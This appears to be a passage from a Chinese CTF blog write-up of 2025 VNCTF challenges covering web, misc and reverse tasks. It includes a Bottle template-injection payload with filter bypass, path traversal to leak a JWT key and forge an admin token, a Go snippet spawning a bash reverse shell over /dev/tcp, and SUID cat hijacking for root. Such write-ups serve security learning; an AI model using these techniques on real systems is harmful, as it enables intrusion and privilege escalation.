+<p>python的单文件框架有Flask Bottle Falcon Sanic Tornado FastAPI等等</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250210183518890.png" alt="image-20250210183518890"></p>
+<p>经分析是一个bottle框</p>
+<blockquote>
+<p>bottle框架可以任意执行单行python代码</p>
+</blockquote>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250210184147681.png" alt="image-20250210184147681"></p>
+<p>另外 字符串有长度限制 已知bottle上下文具有关联功能</p>
+<p>直接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">%a=__builtins__</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">&#123;&#123;a&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看函数发现open</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211144516358.png" alt="image-20250211144516358"></p>
+<p>直接open会hacker，单引号绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">%a=__builtins__</span><br><span class="line">%b=&#x27;op&#x27;&#x27;en&#x27;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">&#123;&#123;a[b]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拼接最终payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">%a=__builtins__</span><br><span class="line">%b=&#x27;op&#x27;&#x27;en&#x27;</span><br><span class="line">%c=&#x27;/flag&#x27;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">&#123;&#123;a[b](c).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>官方wp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;a:=&#x27;&#x27;&#125;&#125;%0a&#123;&#123;b:=a.__class__&#125;&#125;%0a&#123;&#123;c:=b.__base__&#125;&#125;%0a&#123;&#123;d:=c.__subc</span><br><span class="line">lasses__&#125;&#125;%0a&#123;&#123;e:=d()[156]&#125;&#125;%0a&#123;&#123;f:=e.__init__&#125;&#125;%0a&#123;&#123;g:=f.__global</span><br><span class="line">s__&#125;&#125;%0a&#123;&#123;z:=&#x27;__builtins__&#x27;&#125;&#125;%0a&#123;&#123;h:=g[z]&#125;&#125;%0a&#123;&#123;i:=h[&#x27;op&#x27;&#x27;en&#x27;]&#125;&#125;%0</span><br><span class="line">a&#123;&#123;x:=i(&quot;/flag&quot;)&#125;&#125;%0a&#123;&#123;y:=x.read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>思路大同小异</p>
+<p>比如输入<code>&#123;&#123;print(5)&#125;&#125;</code>，实际上5已经输入到控制台了 拼接<code>&#123;&#123;a:=5&#125;&#125;%0a&#123;&#123;print(a)&#125;&#125;</code>发现能读上下文，同理得到flag</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211143330052.png" alt="image-20250211143330052"></p>
+<h2 id="Gin"><a href="#Gin" class="headerlink" title="Gin"></a>Gin</h2><blockquote>
+<p>go是世界上最好的语言</p>
+</blockquote>
+<p>查看routes.go可以大致看出</p>
+<p>普通用户注册后有个上传功能，admin有个eval路由，应该可以执行代码</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211150840054.png" alt="image-20250211150840054"></p>
+<p>并且发现有一个jwt，可以注册个用户看看先</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211150940710.png" alt="image-20250211150940710"></p>
+<p>注册一个用户后登录</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211151437619.png" alt="image-20250211151437619"></p>
+<p>jwt解密</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211151446374.png" alt="image-20250211151446374"></p>
+<p>然后可以看一下jwt相关逻辑</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211151754391.png" alt="image-20250211151754391"></p>
+<p>将年份作为种子，生成0-999拼接上config.Key()</p>
+<p>不过题目源码没给key</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211152118466.png" alt="image-20250211152118466"></p>
+<p>上传任意文件，发现提供了预览和下载两种模式</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211152233512.png" alt="image-20250211152233512"></p>
+<p>download发现任意文件下载</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211152417415.png" alt="image-20250211152417415"></p>
+<p>直接读..&#x2F;config&#x2F;key.go</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211152550059.png" alt="image-20250211152550059"></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> config</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Key</span><span class="params">()</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;r00t32l&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Year</span><span class="params">()</span></span> <span class="type">int64</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">2025</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>抠出来得key</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	rand.Seed(<span class="number">2025</span>)</span><br><span class="line">	randomNumber := rand.Intn(<span class="number">1000</span>)</span><br><span class="line">	key := fmt.Sprintf(<span class="string">&quot;%03d%s&quot;</span>, randomNumber, <span class="string">&quot;r00t32l&quot;</span>)</span><br><span class="line">	fmt.Println(key)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211153820444.png" alt="image-20250211153820444"></p>
+<p>得到key</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">122r00t32l</span><br></pre></td></tr></table></figure>
+
+<p>重新加密</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211160627885.png" alt="image-20250211160627885"></p>
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNzIjoiTWFzaDFyMCIsInN1YiI6InVzZXIgdG9rZW4iLCJleHAiOjE3MzkzNDQ5MjIsImlhdCI6MTczOTI1ODUyMn0.B9r2Fa74H1ENzpZbtpIehx7um0kKI1lSMix4g-RsqxY</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211160646045.png" alt="image-20250211160646045"></p>
+<p>然后就可以看看有什么库可以命令执行的</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211161056899.png" alt="image-20250211161056899"></p>
+<p>整个反弹shell代码</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/PaulXu-cn/goeval&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    cmd, _ := goeval.Eval(<span class="string">&quot;&quot;</span>, <span class="string">&quot;cmd:=exec.Command(\&quot;bash\&quot;,\&quot;-c\&quot;,\&quot;exec bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1\&quot;);out,_:=cmd.CombinedOutput();fmt.Println(string(out))&quot;</span>, <span class="string">&quot;os/exec&quot;</span>, <span class="string">&quot;fmt&quot;</span>)</span><br><span class="line">    fmt.Println(<span class="type">string</span>(cmd))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211161845189.png" alt="image-20250211161845189"></p>
+<p>根目录上是假flag</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211161911762.png" alt="image-20250211161911762"></p>
+<p>查看suid时发现又哥Cat很可疑 执行后回显&#x2F;flag得内容 猜测执行的是cat &#x2F;flag</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211162033413.png" alt="image-20250211162033413"></p>
+<p>劫持cat即可获得root权限</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211162441383.png" alt="image-20250211162441383"></p>
+<p>查看不再使用cat</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211162536102.png" alt="image-20250211162536102"></p>
+<h2 id="javaGuide"><a href="#javaGuide" class="headerlink" title="javaGuide"></a>javaGuide</h2><blockquote>
+<p>java反序列化第一步（题目环境不出网）</p>
+</blockquote>
+<blockquote>
+<p>不会java web 留个档</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/DSchenzi/p/18707270">VNCTF2025部分WP - dynasty_chenzi - 博客园</a></p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="VN-Lang"><a href="#VN-Lang" class="headerlink" title="VN_Lang"></a>VN_Lang</h2><blockquote>
+<p>我真是受够了往misc里塞异形文字了，所以我决定自创VN文字，你能读懂吗？</p>
+</blockquote>
+<p>010一看就有</p>
+<h2 id="Echo-Flowers"><a href="#Echo-Flowers" class="headerlink" title="Echo Flowers"></a>Echo Flowers</h2><blockquote>
+<p><strong>英语不好</strong>的114也想要学习区块链，于是通过自己编写的地址生成器生成了一个0x114514开头的地址助记词（默认路径m&#x2F;44’&#x2F;60’&#x2F;0’&#x2F;0&#x2F;0），并<strong>将助记词导入</strong>了<em>首次搭载四曲柔边直屏，采用居中对称式的圆环镜头+金属质感小银边设计，并辅以拉丝工艺打造的金属质感中框，主打“超防水，超抗摔，超耐用”，号称“耐用战神”的</em>OPPO A5 Pro上作为数字钱包。不幸的是，114忘记了这部手机上数字钱包的密码，同时丢失了助记词。你能帮助114找回他的数字钱包吗？</p>
+<blockquote>
+<p>本题附件下载地址：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1iVxz1GdyFRlLModNBxi9BA?pwd=9prn">百度网盘</a> 或 <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1Az2NI6nrI9C-GnrwO7eGWKnd5dKLtZSk/view?usp=sharing">Google Drive</a></p>
+</blockquote>
+<blockquote>
+<p>114使用的密码是强密码（在8-40字符之间，至少包含一个大写字母、一个小写字母、一个数字和一个特殊字符），因此<strong>暴力破解密码是不现实的</strong>。</p>
+</blockquote>
+<blockquote>
+<p>附件是一个（通过Android-x86模拟的）手机镜像，建议使用VMWare虚拟机平台运行手机镜像，其它虚拟机平台可能会出现非预期的行为。</p>
+<p>你应该从手机镜像中取证找回数字钱包。</p>
+<p>附件中gift文件夹的内容不是解题所必需的。</p>
+</blockquote>
+<blockquote>
+<p>FLAG格式：VNCTF{ETH地址0x114514d3CEc0bB872349a98e21526DbA041F08a9对应的私钥十六进制小写} . 例如，假设私钥是0xaabbcc，那么FLAG是VNCTF{aabbcc} .</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<p>美亚杯后遗症。。</p>
+</blockquote>
+<p>手机钱包通过助记词导入，不难想到输入法</p>
+<blockquote>
+<p>echo_flowers-disk1.vmdk&#x2F;分区2&#x2F;android-7.1-r5&#x2F;data&#x2F;data&#x2F;com.sohu.inputmethod.sogouoem&#x2F;files&#x2F;dict</p>
+</blockquote>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211165836274.png" alt="image-20250211165836274"></p>
+<p>导出后strings大法</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211170030152.png" alt="image-20250211170030152"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">❯ <span class="built_in">cd</span> dict</span><br><span class="line">❯ strings --encoding=b *</span><br><span class="line">ranch</span><br><span class="line">only</span><br><span class="line">space</span><br><span class="line">define</span><br><span class="line">laundry</span><br><span class="line">carpet</span><br><span class="line">muscle</span><br><span class="line">ramp</span><br><span class="line">high</span><br><span class="line">twenty</span><br><span class="line">couch</span><br><span class="line">fashion</span><br></pre></td></tr></table></figure>
+
+<p>bip39网站解密即可</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20250211170635833.png" alt="image-20250211170635833"></p>
+<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="Hook-Fish"><a href="#Hook-Fish" class="headerlink" title="Hook Fish"></a><strong>Hook Fish</strong></h2><blockquote>
+<p>钓到的鱼怎么跑了？</p>
+</blockquote>
+<p>frida脚本发现是一串密文比较</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/c381d1ec53efc0f676b23a20901cf88.png" alt="c381d1ec53efc0f676b23a20901cf88"></p>
+<p>主程序发现动态加载了hookfish.dex</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/0710b2c2761d954c92bfcb9d2100f6a.png" alt="0710b2c2761d954c92bfcb9d2100f6a"></p>
+<p>下载后对应解密即可</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/32e6fe9cb18cb56805595e9fe88ccc3.png" alt="32e6fe9cb18cb56805595e9fe88ccc3"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io">yiyi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io/2025/02/10/2025VNCTF/">https://xyaxxya.github.io/2025/02/10/2025VNCTF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xyaxxya.github.io" target="_blank">Yiyi</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://www.dmoe.cc/random.php?3099" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025/02/07/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" title="2025西湖论剑"><img class="cover" src="https://www.dmoe.cc/random.php?5386" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2025西湖论剑</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/10/31/2024BuildCTF/" title="2024BuildCTF"><img class="cover" src="https://www.dmoe.cc/random.php?3346" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-31</div><div class="title">2024BuildCTF</div></div></a></div><div><a href="/2024/12/31/DASCTF%202024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98%EF%BD%9C%E5%AF%92%E5%A4%9C%E7%A0%B4%E6%99%93%EF%BC%8C%E5%86%AC%E8%87%B3%E7%BB%88%E7%AB%A0web/" title="DASCTF 2024最后一战｜寒夜破晓，冬至终章 web"><img class="cover" src="https://www.dmoe.cc/random.php?7632" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-31</div><div class="title">DASCTF 2024最后一战｜寒夜破晓，冬至终章 web</div></div></a></div><div><a href="/2024/10/01/SCTFweb&misc/" title="SCTFweb&amp;misc"><img class="cover" src="https://www.dmoe.cc/random.php?4277" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-01</div><div class="title">SCTFweb&amp;misc</div></div></a></div><div><a href="/2024/12/16/2024CISCN&%E9%93%81%E4%B8%89%E5%88%9D%E8%B5%9Bweb/" title="2024CISCN&amp;铁三初赛web"><img class="cover" src="https://www.dmoe.cc/random.php?4350" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-16</div><div class="title">2024CISCN&amp;铁三初赛web</div></div></a></div><div><a href="/2024/12/09/2024GeekChallenge/" title="GeekChallenge2024 第十五届极客大挑战"><img class="cover" src="https://www.dmoe.cc/random.php?6382" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-09</div><div class="title">GeekChallenge2024 第十五届极客大挑战</div></div></a></div><div><a href="/2024/06/26/2024CISCN%E5%88%9D%E8%B5%9Bweb/" title="2024CISCN初赛web"><img class="cover" src="https://www.dmoe.cc/random.php?5086" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-26</div><div class="title">2024CISCN初赛web</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yiyi</div><div class="author-info__description">春风得意马蹄疾，一日看尽长安花</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">66</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">76</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xyaxxya"><i class="fab fa-github"></i><span>关注捏</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xyaxxya" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/3170234809@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://blog.csdn.net/xydsg" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="https://xyaxxya.github.io/2023/09/23/about-me/" target="_blank" title="wechat"><i class="fab fa-weixin"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">慢慢来，比较快</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-emlog"><span class="toc-number">1.1.</span> <span class="toc-text">ez_emlog</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6"><span class="toc-number">1.2.</span> <span class="toc-text">奶龙回家</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E7%94%9F%E5%A7%93%E5%90%8D%E7%99%BB%E8%AE%B0%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.3.</span> <span class="toc-text">学生姓名登记系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gin"><span class="toc-number">1.4.</span> <span class="toc-text">Gin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#javaGuide"><span class="toc-number">1.5.</span> <span class="toc-text">javaGuide</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#VN-Lang"><span class="toc-number">2.1.</span> <span class="toc-text">VN_Lang</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Echo-Flowers"><span class="toc-number">2.2.</span> <span class="toc-text">Echo Flowers</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REVERSE"><span class="toc-number">3.</span> <span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hook-Fish"><span class="toc-number">3.1.</span> <span class="toc-text">Hook Fish</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/02/10/2025VNCTF/" title="2025VNCTF"><img src="https://www.dmoe.cc/random.php?3099" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025VNCTF"/></a><div class="content"><a class="title" href="/2025/02/10/2025VNCTF/" title="2025VNCTF">2025VNCTF</a><time datetime="2025-02-10T10:04:34.000Z" title="发表于 2025-02-10 18:04:34">2025-02-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/07/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" title="2025西湖论剑"><img src="https://www.dmoe.cc/random.php?5386" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025西湖论剑"/></a><div class="content"><a class="title" href="/2025/02/07/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" title="2025西湖论剑">2025西湖论剑</a><time datetime="2025-02-07T11:30:37.000Z" title="发表于 2025-02-07 19:30:37">2025-02-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/06/2025SUCTF%E5%8F%96%E8%AF%81%E5%A4%8D%E7%9B%98/" title="2025SUCTF取证复盘"><img src="https://www.dmoe.cc/random.php?9014" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025SUCTF取证复盘"/></a><div class="content"><a class="title" href="/2025/02/06/2025SUCTF%E5%8F%96%E8%AF%81%E5%A4%8D%E7%9B%98/" title="2025SUCTF取证复盘">2025SUCTF取证复盘</a><time datetime="2025-02-06T11:21:39.000Z" title="发表于 2025-02-06 19:21:39">2025-02-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/27/HackMyVM%20Nessus/" title="HackMyVM Nessus"><img src="https://www.dmoe.cc/random.php?7059" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HackMyVM Nessus"/></a><div class="content"><a class="title" href="/2025/01/27/HackMyVM%20Nessus/" title="HackMyVM Nessus">HackMyVM Nessus</a><time datetime="2025-01-27T02:11:15.000Z" title="发表于 2025-01-27 10:11:15">2025-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/26/2024%E9%95%BF%E5%9F%8E%E6%9D%AF&amp;CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-sc05/" title="2024长城杯&amp;CISCN-威胁流量分析-sc05"><img src="https://www.dmoe.cc/random.php?7282" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024长城杯&amp;CISCN-威胁流量分析-sc05"/></a><div class="content"><a class="title" href="/2025/01/26/2024%E9%95%BF%E5%9F%8E%E6%9D%AF&amp;CISCN-%E5%A8%81%E8%83%81%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-sc05/" title="2024长城杯&amp;CISCN-威胁流量分析-sc05">2024长城杯&amp;CISCN-威胁流量分析-sc05</a><time datetime="2025-01-26T02:40:34.000Z" title="发表于 2025-01-26 10:40:34">2025-01-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By yiyi</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">欢迎常来喵~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const initValine = () => {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'pYgEIy3e8aneCT2SHN7sYl1L-gzGzoHsz',
+      appKey: 'V8vEx9nsiDEMy45ekCcPUaiN',
+      avatar: 'monsterid',
+      serverURLs: 'https://pygeiy3e.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: true
+    }, null))
+  }
+
+  const loadValine = async () => {
+    if (typeof Valine === 'function') initValine()
+    else {
+      await getScript('https://cdn.jsdelivr.net/npm/valine@1.5.1/dist/Valine.min.js')
+      initValine()
+    }
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
